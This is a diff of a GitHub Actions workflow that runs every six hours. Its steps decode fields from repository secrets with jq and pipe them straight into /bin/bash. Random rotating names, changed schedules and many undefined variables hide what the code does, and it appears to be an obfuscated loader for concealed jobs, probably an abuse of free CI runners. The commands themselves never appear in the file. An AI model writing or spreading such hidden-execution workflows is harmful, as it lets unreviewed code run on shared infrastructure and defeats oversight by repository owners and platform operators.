@@ -1,27 +1,27 @@
 name: tousanhougua
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 1/6 * * *'
-jobs:  # 30247
+    - cron: '26 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: tousanhougua
         env:
-          zvop6: ${{ secrets.zvop6 }}
+          jgv147: ${{ secrets.jgv147 }}
         run: |
-          echo $zvop6 | jq -r .yi85 | /bin/bash
-          echo $qtq252 | jq -r .bo3 | /bin/bash
-          echo $bpq935 | jq -r .i8361 | /bin/bash
-          echo $b54771 | jq -r .je657 | /bin/bash
-          echo $e03 | jq -r .yu9 | /bin/bash
-          echo $q17 | jq -r .yjcnb1605 | /bin/bash
-          echo $q115 | jq -r .zut76544 | /bin/bash
-          echo $sy1 | jq -r .i2946 | /bin/bash
-          echo $phbgk6 | jq -r .vzk1 | /bin/bash
-          echo $gdj38558 | jq -r .yh7 | /bin/bash
+          echo $jgv147 | jq -r .bxa85947 | /bin/bash
+          echo $mbh3532 | jq -r .kg882 | /bin/bash
+          echo $gihn2 | jq -r .y50 | /bin/bash
+          echo $t81028 | jq -r .ypg5 | /bin/bash
+          echo $lkfxx9 | jq -r .lpfqz9 | /bin/bash
+          echo $yqd53525 | jq -r .r9213 | /bin/bash
+          echo $hx58604 | jq -r .o2419 | /bin/bash
+          echo $xmq48 | jq -r .ezuq46 | /bin/bash
+          echo $qb09574 | jq -r .o32 | /bin/bash
+          echo $n99 | jq -r .aj30 | /bin/bash
+          echo $iz898 | jq -r .dj63 | /bin/bash
+          echo $zqcqr379 | jq -r .exs32 | /bin/bash
 
